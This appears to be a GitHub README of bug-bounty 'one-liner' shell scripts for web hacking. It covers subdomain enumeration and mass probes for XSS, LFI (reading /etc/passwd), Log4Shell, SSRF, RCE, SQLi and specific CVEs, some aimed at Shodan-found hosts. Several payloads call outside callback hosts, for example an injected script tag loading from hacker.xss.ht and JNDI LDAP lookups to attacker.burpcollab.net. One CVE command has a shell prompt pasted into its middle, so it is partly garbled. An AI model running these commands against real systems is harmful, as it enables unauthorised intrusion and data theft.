# One-Liner-Scripts
***A collection of awesome one-liner scripts for Bug Bounty Hunting, && Web Hacking***

# Find Subdomains from Various Sources:
### Get Subdomains from RapidDNS.io
```
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```
### Get Subdomains from BufferOver.run
```
curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```
```
curl "https://tls.bufferover.run/dns?q=$DOMAIN" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$DOMAIN"
```
### Get Subdomains from Riddler.io
```
curl -s "https://riddler.io/search/exportcsv?q=pld:domain.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
### Get Subdomains from VirusTotal
```
curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
### Get Subdomain with cyberxplore
```
curl https://subbuster.cyberxplore.com/api/find?domain=yahoo.com -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```
### Get Subdomains from CertSpotter
```
curl -s "https://certspotter.com/api/v1/issuances?domain=domain.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | tr -d '[]"\n ' | tr ',' '\n'
```
### Get Subdomains from Archive
```
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
### Get Subdomains from JLDC
```
curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
### Get Subdomains from securitytrails
```
curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u
```
### Bruteforcing subdomain using DNS Over
```
while read sub;do echo "https://dns.google.com/resolve?name=$sub.domain.com&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u ; done < wordlists.txt
```
### Get Subdomains With sonar.omnisint.io
```
curl --silent https://sonar.omnisint.io/subdomains/twitter.com | grep -oE "[a-zA-Z0-9._-]+\.twitter.com" | sort -u 
```
### Get Subdomains With synapsint.com
```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2Fdomain.com" | grep -oE "[a-zA-Z0-9._-]+\.domain.com" | sort -u 
```
### Get Subdomains from crt.sh
```
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
### Sort & Tested Domains from Recon.dev
```
curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent
```
________________________________________________________________________________________________________________________________________________________________
# Finding XSS
```
echo "target.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
cat urls.txt | kxss | awk ‘{print $4}’| sort -u | dalfox pipe -b <you blind xss> — custom-payload <your payload> -w 300 — multicast — mass — only-poc -o xss_vulns.txt
```
```
cat urls.txt | kxss | awk ‘{print $4}’| sort -u >> xss_list.txt
```
```
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```
```
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```
```
waybackurls target.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```
waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
```
```
cat subdomains.txt | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
```
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```
```
httpx -l urls.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```
```
gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
```
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
```
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```
```
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
### Xss from Js hidden Libs
```
assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
_________________________________________________________________________________________________________________________________________________________________
# Finding Open-Redirection
```
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
```
waybackurls target.com | grep -a -i \=http | qsreplace 'https://evil.com' | while read host do;do curl -s -L $host -I|grep "https://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; done
```
```
cat domains.txt | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
```
cat waybackurl.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```
_________________________________________________________________________________________________________________________________________________________________
# SubDomain TakeOver
```
cat subdomains.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```
```
subfinder -d target.com >> domains ; assetfinder -subs-only target.com >> domains ; amass enum -norecursive -noalts -d target.com >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
__________________________________________________________________________________________________________________________________________________________________
# LFI
```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```
```
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
```
subfinder -d target.com | httpx -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
```
```
gau https://target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
__________________________________________________________________________________________________________________________________________________________________
# Log4shell
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```
```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
```
```
subfinder -d target.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
```
__________________________________________________________________________________________________________________________________________________________________
# Hidden Dirs
```
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://target.com
```
```
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```
```
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
```
__________________________________________________________________________________________________________________________________________________________________
# JS Recon
### Hidden Params in JS
```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
### Find JS Files
```
gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```
```
assetfinder --subs-only site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```
____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
# RCE
```
subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
### vBulletin 5.6.2
```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
_______________________________________________________________________________________________________________________________________________________________________
# SSRF
```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
```
cat file.txt | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "https://bugbounty.requestcatcher.com/ssrf" | grep "request caught" && echo "$host \033[0;31mVuln\n" || echo "$host \033[0;32mNot\n";done
```
```
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```
___________________________________________________________________________________________________________________________________________________________________
# Finding .git dirs
```
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
__________________________________________________________________________________________________________________________________________________________________
# CVE
### CVE-2021-40438 (SSRF)
```
cat file.txt | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "https://bugbounty.requestcatcher.com/ssrf" | grep "request caught" && echo "$host \033[0;31mVuln\n" || echo "$host \033[0;32mNot\n";done
```
### CVE-2020-5902
```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
### CVE-2020-3452
```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
### CVE-2021-44228
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```
### CVE-2020-13942
```
cat targets.txt | while read host do;do  curl --insecure --silent -X POST http:/root@litt1eb0y bb2 % cat targets.txt | while read host do;do  curl --insecure --silent -X POST http://$host/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}' | grep -qs "boom" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
__________________________________________________________________________________________________________________________________________________________________
# CORS Misconfiguration
```
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
__________________________________________________________________________________________________________________________________________________________________
# Prototype Pollution
```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
__________________________________________________________________________________________________________________________________________________________________
# Portscan without WAF
```
subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```
__________________________________________________________________________________________________________________________________________________________________
# Admin Panel
```
cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
```
__________________________________________________________________________________________________________________________________________________________________
# HeartBleed
```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
```
__________________________________________________________________________________________________________________________________________________________________
# Jaeles scan to bugbounty targets
```
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
```
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
```
cat domains.txt | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
```
__________________________________________________________________________________________________________________________________________________________________
# Nuclei scan to bugbounty targets
```
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
```
```
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```
```
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```
__________________________________________________________________________________________________________________________________________________________________
# SQLi
```
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```
```
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```
__________________________________________________________________________________________________________________________________________________________________
***More Scripts Coming Sooon :)***
__________________________________________________________________________________________________________________________________________________________________
### Support :)
[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/paypalme/litt1eb0y)
